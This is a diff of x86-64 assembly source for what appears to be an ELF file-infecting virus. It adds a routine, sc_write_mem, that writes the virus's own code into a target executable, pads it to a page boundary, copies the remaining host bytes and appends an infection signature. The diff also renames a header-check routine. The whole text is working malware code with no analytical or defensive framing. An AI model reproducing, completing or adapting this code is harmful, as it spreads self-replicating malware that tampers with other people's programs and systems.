@@ -1,9 +1,8 @@
 				extern			sc_get_full_path
 				extern			sc_map_file
 				extern			sc_check_infection
-				extern			sc_test_elf_hdr
-				extern			sc_write_mem
 				extern			sc_str_n_cmp
+				extern			sc_write_pad
 
 				default			rel
 sc:
@@ -311,7 +310,7 @@ sc_check_infection:
  				mov				rsp,					rbp
 				pop				rbp
 				ret
-sc_test_hdr:
+sc_test_elf_hdr:
 				push			rbp
 				mov				rbp,					rsp
 				
@@ -349,6 +348,117 @@ sc_test_hdr:
  .error:
  				mov				rax,					-1
 				jmp				.end
+sc_write_mem:
+				push			rbp
+				mov				rbp,					rsp
+				sub				rsp,					80	;	+0x0	dst
+															;	+0x8	code_offset
+															;	+0x10	sz.mem
+															;	+0x18	sz.load
+															;	+0x20	sz.f_pad
+															;	+0x28	*hdrs.txt
+															;	+0x30	mem
+															;	+0x38	x_pad
+															;	+0x40	sz.mem - (code_offset + sz.f_pad)
+				mov				r8,						qword[sc_glob]
+				mov				r9,						qword[r8+0x18]
+				mov				qword[rsp+0x10],		r9
+				mov				r9,						qword[r8+0x30]
+				mov				qword[rsp+0x18],		r9
+				mov				r9,						qword[r8+0x38]
+				mov				qword[rsp+0x20],		r9
+				mov				r9,						qword[r8+0x50]
+				mov				qword[rsp+0x28],		r9
+				mov				r9,						qword[r8+0xc60]
+				mov				qword[rsp+0x30],		r9
+				mov				r9,						qword[r8+0xc68]
+				mov				qword[rsp+0x38],		r9
+				mov				r9,						qword[rsp+0x10]
+				sub				r9,						qword[rsp+0x8]
+				sub				r9,						qword[rsp+0x20]
+				mov				qword[rsp+0x40],		r9
+
+				mov				rax,					2
+				mov				rsi,					1
+				syscall
+
+				mov				qword[rsp],				rax
+				mov				r9,						qword[rsp+0x28]; *hdrs.txt
+
+				mov				rdi,					qword[rsp]
+				mov				rsi,					qword[rsp+0x30]
+
+				mov				rdx,					qword[r9+0x8]
+				add				rdx,					qword[r9+0x20]
+				sub				rdx,					qword[rsp+0x10]
+				mov				qword[rsp+8],			rdx
+
+				mov				rax,					1
+				syscall
+
+				cmp				rax,					0
+				jl				.close
+				
+				cmp				rax,					qword[rsp+8]
+				jne				.close
+
+				mov				r8,						qword[sc_glob]
+
+				mov				rdi,					qword[rsp]
+				lea				rsi,					[sc]
+				mov				rdx,					qword[r8+0x18]
+				mov				rax, 					1
+				syscall
+			
+				cmp				rax,					0
+				jl				.close
+
+				cmp				rax,					qword[rsp+0x18]
+				jne				.close
+
+				mov				rdi,					qword[rsp]
+
+				mov				rsi,					qword[rsp+0x38]
+				xor				rsi,					rsi
+				xor				rbx,					rbx
+				mov				ebx,					0x1000
+				imul			esi,					ebx
+				add				rsi,					qword[rsp+0x20]
+				sub				rsi,					qword[rsp+0x18]
+				call			sc_write_pad
+
+				cmp				rax,					0
+				jne				.close
+
+				mov				rdi,					qword[rsp]
+				mov				rsi,					qword[rsp+0x30]
+				add				rsi,					qword[rsp+0x8]
+				add				rsi,					qword[rsp+0x20]
+
+				mov				rdx,					qword[rsp+0x40]
+				mov				rax,					1
+				syscall
+
+				cmp				rax,					0
+				jl				.close
+
+				cmp				rax,					qword[rsp+0x40]
+				jne				.close
+
+				mov				rdi,					qword[rsp]
+				lea				rsi,					[sc_sign]
+				mov				rdx,					49
+				mov				rax,					1
+				syscall
+ .close:
+ 				mov				rdi,					qword[rsp]
+				mov				rax,					3
+				syscall
+ .end:
+ 				add				rsp,					80
+ 				mov				rsp,					rbp	
+				pop				rbp
+				ret
 sc_end:
 
 sc_data:
